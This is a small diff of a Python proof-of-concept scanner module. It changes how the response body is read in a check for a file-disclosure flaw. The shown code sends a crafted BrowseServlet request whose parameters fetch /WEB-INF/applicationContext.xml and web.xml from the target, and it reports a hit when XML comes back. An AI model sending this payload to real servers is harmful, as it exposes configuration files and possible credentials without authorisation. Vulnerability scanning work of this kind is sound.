@@ -48,7 +48,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/BrowseServlet?szsat.trancode=401153&szsat.errpage=/WEB-INF/applicationContext.xml&szsat.normalpage=/WEB-INF/web.xml'
             response = requests.get(vul_url)
-            html = response.content
+            html = response.text
             code = response.status_code
             if code == 200 and 'xml version' in html:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
